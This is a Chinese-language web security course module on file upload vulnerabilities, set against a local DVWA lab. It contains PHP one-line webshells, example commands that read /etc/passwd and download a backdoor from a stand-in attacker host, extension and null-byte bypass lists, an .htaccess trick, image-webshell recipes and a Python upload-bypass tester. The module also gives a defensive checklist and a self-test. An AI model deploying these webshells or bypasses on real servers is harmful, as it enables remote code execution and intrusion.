# 07 文件上传漏洞 —— 上传一个"炸弹"

> 文件上传是Web应用最常见的功能之一：头像、附件、文档……
> 但如果上传验证不严，攻击者可以上传恶意文件，**在服务器上执行代码**。
> 这是从"Web漏洞"到"控制服务器"的最短路径之一。

---

## 一、文件上传的本质风险

```
正常上传：用户上传 photo.jpg → 服务器存储 → 显示图片
恶意上传：用户上传 shell.php → 服务器存储 → 访问 shell.php → 服务器执行PHP代码

核心问题：
  上传的文件被存放到了Web可访问的目录
  + 文件扩展名允许服务器当作代码执行
  = 攻击者可以在服务器上执行任意命令
```

### WebShell是什么

```php
<?php
// 最简单的PHP WebShell —— "一句话木马"
eval($_POST['cmd']);    // 执行POST参数中传入的任意PHP代码
?>

// 攻击者上传这个文件后，通过HTTP请求执行命令：
// POST http://target.com/uploads/shell.php
// Body: cmd=system('whoami');
// → 返回服务器当前用户名

// 更完整的命令执行：
// cmd=system('cat /etc/passwd');
// cmd=system('ls -la /var/www/');
// cmd=system('wget http://attacker.com/backdoor -O /tmp/backdoor');
```

---

## 二、文件上传验证方式及绕过

### 2.1 前端验证（最弱，100%可绕过）

```javascript
// 前端JavaScript验证文件类型
function checkFile(file) {
    var allowed = ['jpg', 'png', 'gif'];
    var ext = file.name.split('.').pop().toLowerCase();
    if (!allowed.includes(ext)) {
        alert('只允许上传图片！');
        return false;
    }
    return true;
}
```

```
绕过方法：
  方法1：浏览器禁用JavaScript
  方法2：Burp拦截请求，修改文件名和内容
  方法3：直接用curl/Python发请求，不经过前端

结论：前端验证只是用户体验，不是安全措施。
```

### 2.2 MIME类型验证

```
HTTP上传请求中的Content-Type：
  Content-Type: image/jpeg    ← MIME类型

服务端代码：
  if file.content_type not in ['image/jpeg', 'image/png']:
      return "不允许的文件类型"
```

```
绕过方法：
  Content-Type是客户端发送的，可以随意修改

  用Burp拦截上传请求：
  原始：Content-Type: application/x-php
  修改：Content-Type: image/jpeg
  → 服务端以为你上传的是图片
```

### 2.3 文件扩展名黑名单

```
服务端检查：
  blocked = ['.php', '.jsp', '.asp', '.exe']
  if ext in blocked:
      return "不允许的文件类型"
```

```
绕过方法（黑名单总有遗漏）：

PHP替代扩展名：
  .php3, .php4, .php5, .phtml, .phar, .phps, .pht

JSP替代：
  .jspx, .jspf

ASP替代：
  .aspx, .ashx, .cer, .asa

大小写绕过：
  .PHP, .Php, .pHp

双扩展名：
  shell.php.jpg     → 某些配置下仍然当PHP执行
  shell.jpg.php     → 看最后的扩展名

特殊字符：
  shell.php%00.jpg  → 空字节截断（老版本PHP/Java）
  shell.php\x00.jpg → 同上
  shell.php.       → 末尾加点（Windows会自动去掉）
  shell.php::$DATA → NTFS数据流（Windows IIS）
  shell.php%20      → 末尾空格

.htaccess覆盖（Apache）：
  先上传 .htaccess 文件：
    AddType application/x-httpd-php .jpg
  → 让Apache把.jpg文件当PHP执行
  然后上传 shell.jpg → 被当作PHP执行
```

### 2.4 文件扩展名白名单

```
服务端检查：
  allowed = ['.jpg', '.png', '.gif']
  if ext not in allowed:
      return "不允许的文件类型"
```

```
绕过方法（白名单更难绕过，但仍有可能）：

双扩展名（如果服务端取的是第一个扩展名）：
  shell.jpg.php    → 白名单检查到.jpg → 通过
                   → 但Apache可能按最后的.php执行

空字节截断（老版本）：
  shell.php%00.jpg → 白名单看到.jpg → 通过
                   → 文件系统在%00处截断 → 实际保存为 shell.php

上传.htaccess（如果白名单允许上传任意扩展名文件到可控目录）

图片马（图片中嵌入代码）+ 文件包含漏洞：
  在图片末尾附加PHP代码
  通过文件包含（LFI）让服务器执行这个"图片"
```

### 2.5 文件内容验证

```
服务端检查文件内容的魔术字节（文件头）：
  JPEG: FF D8 FF
  PNG:  89 50 4E 47
  GIF:  47 49 46 38 (GIF8)
```

```
绕过方法：在WebShell前面加上图片文件头

# 最简单的：GIF头 + PHP代码
GIF89a<?php eval($_POST['cmd']); ?>

保存为 shell.php.gif 或 shell.gif

如果配合文件包含漏洞或.htaccess：
  服务器会解析文件中的PHP代码

制作图片马（更隐蔽）：
  在真实图片中嵌入代码

  # Linux下用exiftool在图片元数据中嵌入代码
  exiftool -Comment='<?php eval($_POST["cmd"]); ?>' photo.jpg
  mv photo.jpg shell.php.jpg
```

---

## 三、文件上传利用链

```
仅仅上传成功还不够，需要完整的利用链：

[1] 上传恶意文件 → 绕过验证
[2] 知道文件存储路径 → 才能访问
[3] 文件能被Web服务器解析执行 → 才能执行代码

任何一个环节断开，攻击就失败。

怎么找到上传路径：
  - 上传成功后的响应中可能包含文件URL
  - 页面源码中图片标签的src属性
  - 常见路径猜测：/uploads/, /images/, /attachments/, /media/
  - 目录枚举

什么情况下文件不会被执行：
  - 上传到了非Web目录（不能通过URL访问）
  - 文件被重命名为随机名 + 固定扩展名（如 abc123.jpg）
  - 使用对象存储（OSS/S3），独立域名，不执行脚本
  - 上传目录禁止执行（服务器配置）
```

---

## 四、检测流程

```
第1步：了解上传功能
  - 允许上传什么类型的文件？
  - 文件大小限制？
  - 上传后文件存放在哪？
  - 文件名是否会被修改？

第2步：基础测试
  先上传一个正常文件（如test.jpg），确认功能正常
  记录上传后的文件路径

第3步：逐步测试绕过

  测试1：直接上传WebShell（test.php）
    → 成功？→ 没有任何验证，严重漏洞

  测试2：修改Content-Type
    上传test.php，但Content-Type改为image/jpeg

  测试3：替代扩展名
    test.php3, test.phtml, test.phar

  测试4：双扩展名
    test.php.jpg, test.jpg.php

  测试5：特殊字符
    test.php%00.jpg, test.php., test.php::$DATA

  测试6：大小写
    test.PHP, test.Php

  测试7：文件头伪造
    GIF89a + PHP代码

  测试8：.htaccess上传（Apache）

第4步：如果上传成功
  访问上传的文件URL
  观察是否被执行还是被当作文本下载

第5步：非代码执行的风险
  即使不能执行代码，还可能有：
  - 上传HTML文件 → 存储型XSS
  - 上传SVG文件 → SVG中可以嵌入JavaScript
  - 上传超大文件 → 磁盘耗尽（DoS）
  - 上传同名文件 → 覆盖其他用户的文件
  - 路径遍历 → filename=../../etc/cron.d/backdoor
```

---

## 五、动手实践

### 实践1：DVWA文件上传（Low级别）

```
1. DVWA → File Upload 页面
2. 创建一个PHP文件：

   echo '<?php echo "Hello from WebShell!"; system($_GET["cmd"]); ?>' > /tmp/shell.php

3. 上传 shell.php
4. 上传成功后，注意返回的文件路径
5. 访问：
   http://localhost:8081/hackable/uploads/shell.php
   → 看到 "Hello from WebShell!"

6. 执行命令：
   http://localhost:8081/hackable/uploads/shell.php?cmd=whoami
   http://localhost:8081/hackable/uploads/shell.php?cmd=ls -la
   http://localhost:8081/hackable/uploads/shell.php?cmd=cat /etc/passwd

7. Medium级别：查看源码了解过滤方式，尝试绕过
```

### 实践2：制作图片马

```bash
# 方法1：GIF头+PHP代码
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# 方法2：在真实图片后追加代码
cp /path/to/real/photo.jpg shell.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg

# 方法3：用exiftool注入元数据
# apt install exiftool
exiftool -Comment='<?php system($_GET["cmd"]); ?>' photo.jpg
```

### 实践3：Python上传测试脚本

```python
"""文件上传安全测试"""
import requests

def test_upload(upload_url, cookies, file_param="file"):
    """测试文件上传的各种绕过"""

    tests = [
        # (文件名, Content-Type, 文件内容, 描述)
        ("shell.php", "application/x-php",
         b'<?php echo "VULN"; ?>',
         "直接上传PHP"),

        ("shell.php", "image/jpeg",
         b'<?php echo "VULN"; ?>',
         "修改Content-Type为image/jpeg"),

        ("shell.php3", "application/octet-stream",
         b'<?php echo "VULN"; ?>',
         "替代扩展名.php3"),

        ("shell.phtml", "application/octet-stream",
         b'<?php echo "VULN"; ?>',
         "替代扩展名.phtml"),

        ("shell.php.jpg", "image/jpeg",
         b'<?php echo "VULN"; ?>',
         "双扩展名.php.jpg"),

        ("shell.jpg", "image/jpeg",
         b'GIF89a<?php echo "VULN"; ?>',
         "GIF头伪装+PHP代码"),

        ("shell.PHP", "application/x-php",
         b'<?php echo "VULN"; ?>',
         "大小写绕过.PHP"),

        ("test.html", "text/html",
         b'<script>alert("XSS")</script>',
         "上传HTML（XSS测试）"),

        ("test.svg", "image/svg+xml",
         b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
         "上传SVG（XSS测试）"),
    ]

    for filename, content_type, content, desc in tests:
        files = {file_param: (filename, content, content_type)}
        try:
            resp = requests.post(upload_url, files=files, cookies=cookies, timeout=10)
            success = resp.status_code == 200 and ("success" in resp.text.lower()
                      or "uploaded" in resp.text.lower()
                      or "succesfully" in resp.text.lower())
            status = "上传成功!" if success else f"被拒绝({resp.status_code})"
            flag = " ← 可能有漏洞!" if success else ""
            print(f"  [{desc}] {filename} → {status}{flag}")
        except Exception as e:
            print(f"  [{desc}] 错误: {e}")

# 使用示例（DVWA）
# cookies = {"PHPSESSID": "your_session", "security": "low"}
# test_upload("http://localhost:8081/vulnerabilities/upload/", cookies, "uploaded")
```

---

## 六、文件上传检查清单

```
验证机制：
  □ 是否只有前端验证？（用Burp绕过前端测试）
  □ 是否检查Content-Type？（可以伪造）
  □ 是否用黑名单还是白名单？（黑名单→尝试替代扩展名）
  □ 是否检查文件内容/魔术字节？（图片头伪造）
  □ 是否对文件名做了处理？（特殊字符、路径遍历）

存储安全：
  □ 上传目录是否可以直接通过URL访问？
  □ 上传目录是否禁止执行脚本？
  □ 文件名是否被随机重命名？
  □ 是否使用了独立的文件存储服务？

其他风险：
  □ 文件大小限制（防DoS）
  □ 上传频率限制
  □ 能否通过文件名路径遍历写入任意目录
  □ 能否覆盖其他用户的文件
  □ HTML/SVG文件上传（XSS）
  □ ZIP炸弹（解压后巨大）
```

---

## 七、自测清单

- [ ] 文件上传漏洞的核心危害是什么？
- [ ] WebShell是什么？一句话木马长什么样？
- [ ] 前端验证、MIME类型验证、扩展名黑名单各怎么绕过？
- [ ] 白名单验证比黑名单安全在哪里？仍然可能被绕过吗？
- [ ] 什么是图片马？怎么制作？
- [ ] 文件上传成功后，还需要什么条件才能执行代码？
- [ ] 即使不能执行代码，文件上传还有什么风险？
- [ ] 能在DVWA完成文件上传挑战（Low级别）？

---

> **下一模块：** [08 SSRF/XXE](../08-ssrf-xxe/README.md) —— 服务端的信任危机
